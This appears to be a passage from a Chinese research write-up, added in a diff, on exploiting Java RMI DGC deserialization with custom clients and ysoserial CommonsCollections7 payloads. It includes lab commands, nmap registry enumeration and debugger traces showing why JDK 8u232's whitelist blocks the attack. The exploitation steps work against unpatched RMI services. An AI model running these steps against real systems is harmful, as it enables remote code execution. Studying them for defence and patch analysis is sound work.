+        int     port        = Integer.parseInt( argv[1] );
+        String  cmd         = argv[2];
+        Object  obj         = getObject( cmd );
+        Socket  s_connect   = new Socket( addr, port );
+        WriteHeader( s_connect );
+        WriteBody( s_connect, obj );
+        s_connect.close();
+    }
+}
+--------------------------------------------------------------------------
+
+6) 测试
+
+java_8_40 \
+-cp "commons-collections-3.1.jar:." \
+VulnerableServer2 192.168.65.23 1414
+
+java EvilClientWithUnicastRemoteObject 192.168.65.23 1414 1314
+
+netstat -nltp | grep -E '(1314|1414)'
+
+java \
+-cp "commons-collections-3.1.jar:." \
+DGCClientWithHashtable 192.168.65.23 1314 \
+"/bin/touch /tmp/scz_is_here"
+
+7) 8u232为什么失败(有白名单检查)
+
+java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
+-cp "commons-collections-3.1.jar:." \
+VulnerableServer2 192.168.65.23 1414
+
+java EvilClientWithUnicastRemoteObject 192.168.65.23 1414 1314
+
+这一步可以成功，8u232可以得手。
+
+netstat -nltp | grep -E '(1314|1414)'
+
+java \
+-cp "commons-collections-3.1.jar:." \
+DGCClientWithHashtable 192.168.65.23 1314 \
+"/bin/touch /tmp/scz_is_here"
+
+这一步失败，8u232已经无法得手。
+
+jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005
+
+stop in sun.rmi.transport.DGCImpl.checkInput
+stop at sun.rmi.transport.DGCImpl:409
+
+  [1] sun.rmi.transport.DGCImpl.checkInput (DGCImpl.java:409), pc = 109
+  [2] sun.rmi.transport.DGCImpl.access$300 (DGCImpl.java:72), pc = 1
+  [3] sun.rmi.transport.DGCImpl$2.lambda$run$0 (DGCImpl.java:343), pc = 1
+  [4] sun.rmi.transport.DGCImpl$2$$Lambda$4.787867107.checkInput (null), pc = 1
+  [5] java.io.ObjectInputStream.filterCheck (ObjectInputStream.java:1,238), pc = 53
+  [6] java.io.ObjectInputStream.readNonProxyDesc (ObjectInputStream.java:1,877), pc = 154
+  [7] java.io.ObjectInputStream.readClassDesc (ObjectInputStream.java:1,750), pc = 86
+  [8] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,041), pc = 22
+  [9] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
+  [10] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
+  [11] sun.rmi.transport.DGCImpl_Skel.dispatch (DGCImpl_Skel.java:90), pc = 195
+  [12] sun.rmi.server.UnicastServerRef.oldDispatch (UnicastServerRef.java:469), pc = 137
+  [13] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:301), pc = 44
+  [14] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
+  [15] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
+  [16] java.security.AccessController.doPrivileged (native method)
+  [17] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
+  [18] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:573), pc = 185
+  [19] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:798), pc = 457
+  [20] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0 (TCPTransport.java:688), pc = 1
+  [21] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5.764267969.run (null), pc = 4
+  [22] java.security.AccessController.doPrivileged (native method)
+  [23] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:687), pc = 58
+  [24] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,149), pc = 95
+  [25] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:624), pc = 5
+  [26] java.lang.Thread.run (Thread.java:748), pc = 11
+
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/java/io/ObjectInputStream.java
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/transport/DGCImpl.java
+
+--------------------------------------------------------------------------
+/*
+ * sun.rmi.transport.DGCImpl.checkInput
+ */
+/**
+ * ObjectInputFilter to filter DGC input objects.
+ * The list of acceptable classes is very short and explicit.
+ * The depth and array sizes are limited.
+ *
+ * @param filterInfo access to class, arrayLength, etc.
+ * @return  {@link ObjectInputFilter.Status#ALLOWED} if allowed,
+ *          {@link ObjectInputFilter.Status#REJECTED} if rejected,
+ *          otherwise {@link ObjectInputFilter.Status#UNDECIDED}
+ */
+private static ObjectInputFilter.Status checkInput(ObjectInputFilter.FilterInfo filterInfo) {
+    if (dgcFilter != null) {
+/*
+ * 386行，如果指定-Dsun.rmi.transport.dgcFilter='*'，流程至此。接下来会去
+ * 调用sun.misc.ObjectInputFilter$Config$Global.checkInput，后者会返回
+ * UNDECIDED。接下来流程会去393行，在那里返回REJECTED。
+ */
+        ObjectInputFilter.Status status = dgcFilter.checkInput(filterInfo);
+        if (status != ObjectInputFilter.Status.UNDECIDED) {
+            // The DGC filter can override the built-in white-list
+            return status;
+        }
+    }
+/*
+ * 393行，如果指定-Dsun.rmi.transport.dgcFilter='*'，流程至此
+ *
+ * filterInfo.depth()等于6，DGC_MAX_DEPTH等于5
+ */
+    if (filterInfo.depth() > DGC_MAX_DEPTH) {
+/*
+ * 394行
+ */
+        return ObjectInputFilter.Status.REJECTED;
+    }
+    Class<?> clazz = filterInfo.serialClass();
+    if (clazz != null) {
+        while (clazz.isArray()) {
+            if (filterInfo.arrayLength() >= 0 && filterInfo.arrayLength() > DGC_MAX_ARRAY_SIZE) {
+                return ObjectInputFilter.Status.REJECTED;
+            }
+            // Arrays are allowed depending on the component type
+            clazz = clazz.getComponentType();
+        }
+        if (clazz.isPrimitive()) {
+            // Arrays of primitives are allowed
+            return ObjectInputFilter.Status.ALLOWED;
+        }
+/*
+ * 409行，java.util.Hashtable无法通过这个白名单检查，返回REJECTED
+ */
+        return (clazz == ObjID.class ||
+                clazz == UID.class ||
+                clazz == VMID.class ||
+                clazz == Lease.class)
+                ? ObjectInputFilter.Status.ALLOWED
+                : ObjectInputFilter.Status.REJECTED;
+    }
+    // Not a class, not size limited
+    return ObjectInputFilter.Status.UNDECIDED;
+}
+--------------------------------------------------------------------------
+
+java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
+-Dsun.rmi.transport.dgcFilter='*' \
+-cp "commons-collections-3.1.jar:." \
+VulnerableServer2 192.168.65.23 1414
+
+指定dgcFilter，仍然失败，提示:
+
+INFO: ObjectInputFilter REJECTED: null, array length: -1, nRefs: 30, depth: 6, bytes: 877, ex: n/a
+
+一般REJECTED后面显示被禁止的class，如果显示null，表示一种特殊的检查，此时
+被REJECTED的原因是depth=6，大于5。这种特殊的检查无法通过调整dgcFilter来绕
+过，算是功能性BUG。
+
+  [1] sun.misc.ObjectInputFilter$Config$Global.checkInput (ObjectInputFilter.java:642), pc = 0
+  [2] sun.rmi.transport.DGCImpl.checkInput (DGCImpl.java:386), pc = 10
+  [3] sun.rmi.transport.DGCImpl.access$300 (DGCImpl.java:72), pc = 1
+  [4] sun.rmi.transport.DGCImpl$2.lambda$run$0 (DGCImpl.java:343), pc = 1
+  [5] sun.rmi.transport.DGCImpl$2$$Lambda$5.1374677625.checkInput (null), pc = 1
+  [6] java.io.ObjectInputStream.filterCheck (ObjectInputStream.java:1,238), pc = 53
+  [7] java.io.ObjectInputStream.readHandle (ObjectInputStream.java:1,701), pc = 131
+  [8] java.io.ObjectInputStream.readClassDesc (ObjectInputStream.java:1,744), pc = 65
+  [9] java.io.ObjectInputStream.readArray (ObjectInputStream.java:1,929), pc = 22
+  [10] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,566), pc = 335
+  [11] java.io.ObjectInputStream.defaultReadFields (ObjectInputStream.java:2,286), pc = 150
+  [12] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,210), pc = 298
+  [13] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
+  [14] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
+  [15] java.io.ObjectInputStream.readArray (ObjectInputStream.java:1,974), pc = 412
+  [16] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,566), pc = 335
+  [17] java.io.ObjectInputStream.defaultReadFields (ObjectInputStream.java:2,286), pc = 150
+  [18] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,210), pc = 298
+  [19] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
+  [20] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
+  [21] java.io.ObjectInputStream.defaultReadFields (ObjectInputStream.java:2,286), pc = 150
+  [22] java.io.ObjectInputStream.defaultReadObject (ObjectInputStream.java:560), pc = 41
+  [23] org.apache.commons.collections.map.LazyMap.readObject (LazyMap.java:143), pc = 1
+  [24] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
+  [25] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
+  [26] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
+  [27] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
+  [28] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
+  [29] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
+  [30] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
+  [31] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
+  [32] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
+  [33] java.util.Hashtable.readObject (Hashtable.java:1,211), pc = 208
+  [34] sun.reflect.NativeMethodAccessorImpl.invoke0 (native method)
+  [35] sun.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62), pc = 100
+  [36] sun.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43), pc = 6
+  [37] java.lang.reflect.Method.invoke (Method.java:498), pc = 56
+  [38] java.io.ObjectStreamClass.invokeReadObject (ObjectStreamClass.java:1,170), pc = 24
+  [39] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,177), pc = 119
+  [40] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
+  [41] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
+  [42] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
+  [43] sun.rmi.transport.DGCImpl_Skel.dispatch (DGCImpl_Skel.java:90), pc = 195
+  [44] sun.rmi.server.UnicastServerRef.oldDispatch (UnicastServerRef.java:469), pc = 137
+  [45] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:301), pc = 44
+  [46] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
+  [47] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
+  [48] java.security.AccessController.doPrivileged (native method)
+  [49] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
+  [50] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:573), pc = 185
+  [51] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:798), pc = 457
+  [52] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0 (TCPTransport.java:688), pc = 1
+  [53] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$6.1876141160.run (null), pc = 4
+  [54] java.security.AccessController.doPrivileged (native method)
+  [55] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:687), pc = 58
+  [56] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,149), pc = 95
+  [57] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:624), pc = 5
+  [58] java.lang.Thread.run (Thread.java:748), pc = 11
+
+http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/misc/ObjectInputFilter.java
+
+--------------------------------------------------------------------------
+/*
+ * sun.misc.ObjectInputFilter$Config$Global.checkInput
+ */
+/**
+ * {@inheritDoc}
+ */
+@Override
+public Status checkInput(FilterInfo filterInfo) {
+    if (filterInfo.references() < 0
+            || filterInfo.depth() < 0
+            || filterInfo.streamBytes() < 0
+            || filterInfo.references() > maxReferences
+            || filterInfo.depth() > maxDepth
+            || filterInfo.streamBytes() > maxStreamBytes) {
+        return Status.REJECTED;
+    }
+
+    Class<?> clazz = filterInfo.serialClass();
+    if (clazz != null) {
+        if (clazz.isArray()) {
+            if (filterInfo.arrayLength() >= 0 && filterInfo.arrayLength() > maxArrayLength) {
+                // array length is too big
+                return Status.REJECTED;
+            }
+            if (!checkComponentType) {
+                // As revised; do not check the component type for arrays
+                return Status.UNDECIDED;
+            }
+            do {
+                // Arrays are decided based on the component type
+                clazz = clazz.getComponentType();
+            } while (clazz.isArray());
+        }
+
+        if (clazz.isPrimitive())  {
+            // Primitive types are undecided; let someone else decide
+            return Status.UNDECIDED;
+        } else {
+            // Find any filter that allowed or rejected the class
+            final Class<?> cl = clazz;
+            Optional<Status> status = filters.stream()
+                    .map(f -> f.apply(cl))
+                    .filter(p -> p != Status.UNDECIDED)
+                    .findFirst();
+            return status.orElse(Status.UNDECIDED);
+        }
+    }
+/*
+ * 642行，如果指定-Dsun.rmi.transport.dgcFilter='*'，流程至此
+ */
+    return Status.UNDECIDED;
+}
+--------------------------------------------------------------------------
+
+8u232指定dgcFilter时的行为应该算是BUG，无法通过调整maxdepth来绕过。无论怎
+么调整maxdepth，总有一处返回REJECTED。
+
+8) 用DGCClientWithHashtable打常规RMI动态端口
+
+只要侦听RMI周知端口、动态端口，就有DGC在其中。对于低版本Java，找到RMI动态
+端口就可以用DGCClientWithHashtable或ysoserial.exploit.JRMPClient打，不需要
+EvilClientWithUnicastRemoteObject或ysoserial.payloads.JRMPListener。
+
+参看:
+
+《Java RMI入门(4)》
+http://scz.617.cn/network/202003191728.txt
+
+复用其中某些class。
+
+假设目录结构是:
+
+.
+|
++---test1
+|       SomeDynamicServer4.class
+|       SomeInterface4.class
+|       SomeInterface4Impl.class
+|       commons-collections-3.1.jar
+|
+\---test2
+        DGCClientWithHashtable.class
+        commons-collections-3.1.jar
+        ysoserial-0.0.6-SNAPSHOT-all.jar
+        rmi-dumpregistry.nse
+
+在test1目录执行:
+
+rmiregistry 1099
+
+java_8_40 \
+-cp "commons-collections-3.1.jar:." \
+-Djava.naming.factory.initial=com.sun.jndi.rmi.registry.RegistryContextFactory \
+-Djava.naming.provider.url=rmi://192.168.65.23:1099 \
+SomeDynamicServer4 any
+
+在test2目录执行:
+
+nmap -n -Pn -p 1099 --script rmi-dumpregistry.nse 192.168.65.23
+
+PORT     STATE SERVICE
+1099/tcp open  java-rmi
+| rmi-dumpregistry:
+|   any
+|      implements java.rmi.Remote, SomeInterface4,
+|     extends
+|       java.lang.reflect.Proxy
+|       fields
+|           Ljava/lang/reflect/InvocationHandler; h
+|             java.rmi.server.RemoteObjectInvocationHandler
+|             @192.168.65.23:45246
+|             extends
+|_              java.rmi.server.RemoteObject
+
+java \
+-cp "commons-collections-3.1.jar:." \
+DGCClientWithHashtable 192.168.65.23 45246 \
+"/bin/touch /tmp/scz_is_here"
+
+java \
+-cp ysoserial-0.0.6-SNAPSHOT-all.jar \
+ysoserial.exploit.JRMPClient 192.168.65.23 45246 \
+CommonsCollections7 "/bin/touch /tmp/scz_is_here"
+
+"CVE-2017-3241进阶"篇用8u232可以得手，DGCClientWithHashtable只能打8u40等低
+版本。
+
+9) 用DGCClientWithHashtable打常规RMI周知端口
+
+RMI周知端口一样有DGC在其中。对于低版本Java，可以用DGCClientWithHashtable或
+ysoserial.exploit.JRMPClient打RMI周知端口。之前打RMI周知端口用过
+ysoserial.exploit.RMIRegistryExploit。
+
+参看:
+
+《Java RMI入门(6)》
+http://scz.617.cn/network/202004011650.txt
+
+复用其中某些class。
+
+假设目录结构是:
+
+.
+|
++---test1
+|       RMIRegistryServer.class
+|       commons-collections-3.1.jar
+|
+\---test2
+        DGCClientWithHashtable.class
+        commons-collections-3.1.jar
+        ysoserial-0.0.6-SNAPSHOT-all.jar
+
+在test1目录执行:
+
+java_8_40 \
+-Djava.rmi.server.hostname=192.168.65.23 \
+-cp "commons-collections-3.1.jar:." \
+RMIRegistryServer 1099
+
+在test2目录执行:
+
+java \
+-cp "commons-collections-3.1.jar:." \
+DGCClientWithHashtable 192.168.65.23 1099 \
+"/bin/touch /tmp/scz_is_here"
+
+java \
+-cp ysoserial-0.0.6-SNAPSHOT-all.jar \
+ysoserial.exploit.JRMPClient 192.168.65.23 1099 \
+CommonsCollections7 "/bin/touch /tmp/scz_is_here"
+
+☆ 参考资源
+
+[52]
+    ysoserial
+    https://github.com/frohoff/ysoserial/
+    https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
+    (A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization)
+    (可以自己编译，不需要下这个jar包)
+
+    git clone https://github.com/frohoff/ysoserial.git
